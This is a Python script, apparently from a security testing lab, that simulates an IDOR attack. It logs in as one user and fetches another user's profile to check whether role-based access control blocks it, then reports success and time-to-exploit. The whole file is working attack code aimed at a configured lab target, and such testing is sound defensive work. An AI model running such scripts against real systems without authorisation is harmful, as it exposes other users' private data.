"""
IDOR (Insecure Direct Object Reference) Attack
=================================================
Simulates an IDOR attack: log in as user1, then try to access user2's profile.

Behaviour with controls:
    ✅ RBAC ON  → /profile/2 returns 403 (Access denied)
    ❌ RBAC OFF → /profile/2 returns 200 (Profile data leaked)

Output:
    {
        "attack": "idor",
        "success": true/false,
        "tte": <seconds>,
        "details": "..."
    }
"""

import time
import requests

from config import TARGET_URL, USERS


def run_idor_attack(attacker_username: str = "user1",
                    target_user_id: int = 3,
                    verbose: bool = True) -> dict:
    """
    Execute an IDOR attack.

    1. Log in as `attacker_username`
    2. Use the session cookie to access /profile/<target_user_id>
    3. If the server returns 200, RBAC is broken → exploit succeeds

    Args:
        attacker_username:  Username to authenticate as.
        target_user_id:     The user_id we are NOT authorised to access.
        verbose:            Print progress to stdout.

    Returns:
        dict with keys: attack, success, tte, details
    """
    login_url   = f"{TARGET_URL}/login"
    profile_url = f"{TARGET_URL}/profile/{target_user_id}"

    attacker = USERS.get(attacker_username)
    if not attacker:
        return {
            "attack": "idor",
            "attack_type": "IDOR Access",
            "success": False,
            "tte": 0.0,
            "details": f"Unknown attacker username: {attacker_username}",
        }

    start_time = time.time()

    if verbose:
        print(f"\n{'='*60}")
        print(f"  🕵️  IDOR ATTACK")
        print(f"  Attacker    : {attacker_username} (id={attacker['id']})")
        print(f"  Target      : /profile/{target_user_id}")
        print(f"  Login URL   : {login_url}")
        print(f"  Profile URL : {profile_url}")
        print(f"{'='*60}\n")

    # ── Step 1: Authenticate ─────────────────────────────────────────────
    session = requests.Session()

    try:
        login_resp = session.post(
            login_url,
            json={
                "username": attacker_username,
                "password": attacker["password"],
            },
            timeout=5,
        )
    except requests.ConnectionError:
        return {
            "attack": "idor",
            "attack_type": "IDOR Access",
            "success": False,
            "tte": 0.0,
            "details": "Connection refused — is the target webapp running?",
        }

    if login_resp.status_code != 200:
        elapsed = round(time.time() - start_time, 4)
        details = f"Login failed ({login_resp.status_code})"
        if verbose:
            print(f"  ❌ {details}")
        return {
            "attack": "idor",
            "attack_type": "IDOR Access",
            "success": False,
            "tte": elapsed,
            "details": details,
        }

    if verbose:
        print(f"  ✅ Logged in as {attacker_username}")

    # ── Step 2: Attempt to access another user's profile ─────────────────
    profile_resp = session.get(profile_url, timeout=5)
    elapsed = round(time.time() - start_time, 4)
    status = profile_resp.status_code

    if status == 200:
        # RBAC is disabled — we can see another user's data
        success = True
        body = profile_resp.text[:200]  # use .text — profile page may return HTML, not JSON
        details = f"Access GRANTED to /profile/{target_user_id} — RBAC bypass! Preview: {body!r}"
        if verbose:
            print(f"  🔓 {details}")
    elif status == 403:
        # RBAC is working — access denied
        success = False
        details = f"Access DENIED (403) to /profile/{target_user_id} — RBAC is active"
        if verbose:
            print(f"  🛡️  {details}")
    elif status == 401:
        success = False
        details = f"Not authenticated (401) — session issue"
        if verbose:
            print(f"  ❌ {details}")
    else:
        success = False
        details = f"Unexpected status {status}"
        if verbose:
            print(f"  ❓ {details}")

    result = {
        "attack": "idor",
        "attack_type": "IDOR Access",
        "success": success,
        "tte": elapsed,
        "details": details,
    }

    if verbose:
        print(f"\n{'─'*60}")
        print(f"  Result : {'✅ EXPLOIT SUCCESS' if success else '❌ EXPLOIT FAILED'}")
        print(f"  TTE    : {elapsed}s")
        print(f"  Details: {details}")
        print(f"{'─'*60}\n")

    return result


# ─── Standalone execution ────────────────────────────────────────────────────
if __name__ == "__main__":
    result = run_idor_attack()
    print("\nRaw result:")
    import json
    print(json.dumps(result, indent=2))
